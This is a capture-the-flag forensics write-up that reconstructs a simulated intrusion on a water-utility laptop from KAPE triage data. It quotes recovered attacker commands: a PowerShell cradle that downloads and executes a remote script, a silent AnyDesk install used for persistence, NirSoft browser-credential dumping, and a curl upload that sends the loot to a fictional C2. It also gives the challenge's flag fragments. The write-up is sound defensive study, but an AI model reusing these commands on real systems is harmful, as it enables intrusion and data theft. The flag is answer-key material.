---
tags: [forensics, kape, windows, browser]
---

🇬🇧 English · [🇫🇷 Français](README.fr.md)

# CAPTCHA THE WATER PLANT

| Category | Points | Solves | Solved | First blood | Author |
|---|---|---|---|---|---|
| forensics | 168 | 32 | ✅ | — | Marius Merai |

## Challenge description

> Nordvia Water Utility lost its distribution-control panel and pressure collapsed across the northern districts. An administrator account was used from one of three laptops. The KAPE triage collections were taken after the incident.
>
> Follow the evidence from what the user ran, to what it launched, to the persistence it left behind, and finally to the browser evidence it exposed. All hosts and domains in the evidence are fictional. Analyse the supplied files offline only.
> Attachments: `ENG-LAPTOP-23.zip`, `FIELD-WKS-21.zip`, `OPS-NB-06.zip`.
> Flag format: `CSCTF{...}`.

**Artifact files:** `files/ENG-LAPTOP-23.zip`, `files/FIELD-WKS-21.zip`, `files/OPS-NB-06.zip` (not committed — currently in `forensics/`, to be moved later)

## TL;DR

KAPE parsed triage for three laptops; only OPS-NB-06 (user `ops06.nwu`) touches the fictional C2. Win+R download cradle → validator drops AnyDesk RMM (`C:\temp\Maitenance`, unattended password set) → daily scheduled task + service persistence → browser theft session (Nirsoft dumps, exfil). No literal `CSCTF{...}` exists in any artifact: the flag is **the concatenation of three leetspeak fragments**, one per stage of the chain (RMM password `f@k3_c@ptch@` + scheduled-task description `_r3@l_m@lw@r3` + admin-token suffix `cl1ckf1xed`). Each was refused when submitted alone.

## Approach

**1. Recon — inventory the three collections, attribute the host**

Each zip holds `Kape-parsed-<HOST>/` (EventLogs, FileFolderAccess, FileSystem, ProgramExecution, Registry, SRUM, WebBrowsers/Hindsight_output.xlsx; only OPS-NB-06 has `Persistence/`). First question: which laptop ran the admin account against the C2?

```bash
for h in ENG-LAPTOP-23 FIELD-WKS-21 OPS-NB-06; do
  unzip -p $h.zip "*EvtxECmd_Output.csv" | grep -c -i 'zindetify\|validator'
done
# ENG: 0, FIELD: 0, OPS: dozens
```

ENG-LAPTOP-23 (`eng-23.nwu`, engineer) and FIELD-WKS-21 (`field21.nwu`, field operator) are clean builds: Ninite bundle, Yamato WELA hardening, KB5020044, KeePass/PuTTY/Thunderbird, per-role water-panel tokens (`NVW-ENG-*`, `NVW-FIELD-*`, shared `a7f39c2e` suffix), KAPE self-collection. No script-host abuse, no RMM outside Ninite's legit AnyDesk on FIELD, no custom persistence.

**2. Hypothesis — OPS-NB-06 is the attacker-operated admin laptop**

`Registry/*UserActivity_Output.csv` (UserAssist/RunMRU, user `ops06.nwu`, 2026-10-21 04:30:47):

```
powershell.exe -nop -ep Bypass "[System.Text.Encoding]::UTF8.GetString(
  (New-Object System.Net.WebClient).DownloadData(
  'http://zindetify.dev.boot:8080/validator')) | iex"
```

Security 4688 in `EventLogs/*EvtxECmd_Output.csv` confirms the chain: `explorer.exe → powershell.exe` (cradle) → `C:\temp\Maitenance\Setup\AnyDesk.exe --install ... --start-with-win --silent` (04:31:04), re-run daily as `SYSTEM` at 15:10 (scheduled task).

**3. Exploitation — validator, persistence, RMM password, browser loot**

PowerShell ScriptBlockLogging (4104) in the same Evtx captures the `validator` body: ~50 junk `Get-Data01…50` functions plus the real stages — `Register-ScheduledTask 'Maitenance Check …' -Daily -At 11:10AM` with the cradle as action, AnyDesk download from `/tool`, install, then:

```
--set-password "f@k3_c@ptch@"
```

Persistence (`Persistence/Scheduled Tasks.csv`, UTF-16, + `Registry/*ASEPs*.csv`):

- `\Maitenance Check ????` (emoji in MFT: `Maitenance Check 👍🙈`), RunAs `ops06.nwu`, daily, action = cradle, comment `_r3@l_m@lw@r3` (= `_real_malware`).
- `HKLM\SYSTEM\...\Services\AnyDesk` (auto start, LocalSystem), six firewall allow rules, `.anydesk` file associations.
- `Run/RunOnce`: only legit OneDrive/Edge/KeePass/SecurityHealth.

Interactive session (4104, PID 2364, 2026-10-28 03:46–04:06): `whoami`, `net localgroup administrators`, Defender exclusion, `wget …/suite -OutFile nirsoft_pass_and_history.zip`, `BrowsingHistoryView.exe /stext browhisto.txt` (133 KB), `WebBrowserPassView.exe /stext webpass.txt` (**2 bytes — no saved passwords anywhere; logins were all declined-save**), `Compress-Archive *.txt → out.zip`, exfil `curl -F "file=out.zip" http://zindetify.dev.boot:8080/up/{$guid}`. MFT corroborates every file (`nirsoft/`, `here.txt`, `out.txt`, `browhisto.txt`, `webpass.txt`, `out.zip`).

Browser (`WebBrowsers/Hindsight_output.xlsx`, Edge profile `ops06.nwu`): `www` → `water-monitor` → `admin-control` loops (`NVW-OPS-892` pre-compromise 10-16, `NVW-OPS-739` 10-21 04:31:31 UTC during the attack, `NVW-ADMIN-cl1ckf1xed` interactive 10-28 session). Role tokens follow `NVW-<ROLE>-<n>-a7f39c2e`; the only one breaking the pattern is `NVW-ADMIN-cl1ckf1xed`, whose suffix `cl1ckf1xed` ("clickfixed") is a leetspeak fragment.

**4. Assembly — one fragment per stage named in the prompt**

The prompt lists four stages (ran → launched → persistence → browser); the last three each yield a fragment in the same style:

| Stage | Artifact | Fragment |
|---|---|---|
| Launched (RMM) | 4104 `--set-password` | `f@k3_c@ptch@` |
| Persistence | `Scheduled Tasks.csv`, description = output of `Get-Data51` (`/config`, the only function outside the 01–50 decoy series) | `_r3@l_m@lw@r3` |
| Browser | token `NVW-ADMIN-cl1ckf1xed` (Hindsight) | `cl1ckf1xed` |

The leading `_` of the 2nd fragment means direct concatenation; the 3rd is joined with `_`. My first three submissions failed because I submitted **one** fragment at a time.

```bash
python3 solve/solve.py files/
```

```
[+] Assembled flag (3 fragments): flag{...}   (redacted)
```

Solve script: [`solve/solve.py`](solve/solve.py)

## Flag

`flag{...}` (redacted — assembly of the 3 fragments `f@k3_c@ptch@` + `_r3@l_m@lw@r3` + `_cl1ckf1xed`)

## Reflections

- Host attribution first (C2 references per host) saves hours: two of three collections are decoys with the same fictional domains.

- When nothing literal exists, look for **fragments in the same style** (here leetspeak with `@`/digits) spread across the stages the prompt enumerates: one `grep` on `[a-z]@[a-z]` found the password, the task description and the token in a single pass. Submitting each fragment alone was the mistake.
- KAPE parsed CSVs answer the whole chain without mounting anything: RunMRU/UserAssist → Prefetch/Amcache → ScheduledTasks/ASEPs → Hindsight Timeline/Sessions. 4104 is the bonus that reveals the RMM password and the exfil loop (`type`, `Compress-Archive`, `curl /up/{guid}`).
- The `Scheduled Tasks.csv` is UTF-16 (schtasks output, not KAPE-parsed UTF-8) — naive `grep` on raw bytes misses it; parse with UTF-16.
- Stealer output matters even when empty: 2-byte `webpass.txt` + declined-save logins prove no credential was saved; the exfiltrated loot was history + the RMM foothold whose password (`f@k3_c@ptch@`, "fake captcha" = title) is the flaggable secret.

## Tools & references

- Python 3 (`zipfile`, `csv`, `re`, `openpyxl`) + `unzip -p … | grep`
- Eric Zimmerman tools via KAPE modules (RECmd, PECmd, AmcacheParser, EvtxECmd, Hindsight)
- NirSoft WebBrowserPassView / BrowsingHistoryView (attacker-side, from evidence)
- MITRE ATT&CK: T1059.001 (PowerShell), T1219 (RMM), T1053.005 (Scheduled Task), T1555 (credentials in files — attempted)

---
[⬅ Back to event](../../README.md)
